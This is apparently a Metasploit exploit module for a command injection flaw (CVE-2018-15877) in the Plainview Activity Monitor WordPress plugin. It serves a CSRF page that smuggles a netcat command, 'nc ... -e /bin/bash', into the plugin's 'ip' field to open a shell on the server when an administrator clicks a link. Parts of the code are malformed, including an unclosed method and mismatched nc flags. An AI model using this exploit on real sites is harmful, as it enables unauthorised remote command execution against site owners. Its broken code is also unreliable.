##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
    Rank = NormalRanking
  
    include Msf::Exploit::Remote::HttpServer
    include Msf::Exploit::EXE
    include Msf::Exploit::RopDb
    include Msf::Exploit::Remote::BrowserAutopwn

    def initialize(info = {})
        super(
          update_info(
            info,
            'Name'           => "WordPress Plugin Plainview Activity Monitor - Command Injection",
            'Description'    => %q{
	Plainview Activity Monitor Wordpress plugin is vulnerable to OS
	command injection which allows an attacker to remotely execute
	commands on underlying system. Application passes unsafe user supplied
	data to ip parameter into activities_overview.php.
	Privileges are required in order to exploit this vulnerability, but
	this plugin version is also vulnerable to CSRF attack and Reflected
	XSS. Combined, these three vulnerabilities can lead to Remote Command
	Execution just with an admin click on a malicious link.

            },
            'License'        => MSF_LICENSE,
            'Author'         => [
                'LydA(c)ric Lefebvre (https://www.linkedin.com/in/lydericlefebvre)',          # Original research and exploitation
                'Sungha Park <l4wk3r[at]gmail.com>'            # Metasploit module
              ],
            'Platform'       => 'linux',
            'Targets'        =>
              [
                [ 'Automatic', {} ],
                [ 'Plainview Activity Monitor (Wordpress plugin)', { } ]
              ],
            'References'     =>
              [
                [ 'CVE', '2018-15877' ],   
                [ 'EBD', '45274' ]       
              ],
            'Arch'           => ARCH_X86,
            'DisclosureDate' => "Aug 27, 2018",
            'DefaultTarget'  => 0
          )
        )

    register_options(
      [
        OptString.new('WP_URL', [ false, 'Put in Wordpress Server URL', "http://localhost/wordpress"])
		
      ], self.class)
    end

    def get_target(agent)
      return target if target.name != 'Automatic'
  
      li = agent.scan(/Linux ((x|i)\d+_*\d*)/).flatten[0] || ""
      cm = agent.scan(/Chrome\/(\d+.\d+.\d+.\d+)/).flatten[0] || ""
  
      cm_name = "Chrome #{cm}"

      case li
      when 'x86_64'
        os_name = 'Linux 64bit'
      when 'i686'
        os_name = 'Linux 32bit'
      end
    
    def get_payload(t)
      payload = datastore['WP_URL']
      payload
    end

    def get_html(t)
      # js_p = ::Rex::Text.to_unescape(get_payload(t), ::Rex::Arch.endian(t.arch))
      js_p = get_payload(t)


      html = <<-HTML
<!DOCTYPE HTML>

<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="#{js_p}/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="ip" value="google.fr| nc -nlvp 127.0.0.1 9999 -e /bin/bash" />
      <input type="hidden" name="lookup" value="Lookup" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

      HTML

      html.gsub(/^\t\t/, '')
    end

    def on_request_uri(cli, request)
      agent = request.headers['User-Agent']
      print_status("Requesting: #{request.uri}")
  
      target = get_target(agent)
      html = get_html(target)
      send_response(cli, html, 'Content-Type' => 'text/html', 'Cache-Control' => 'no-cache')
    end

end

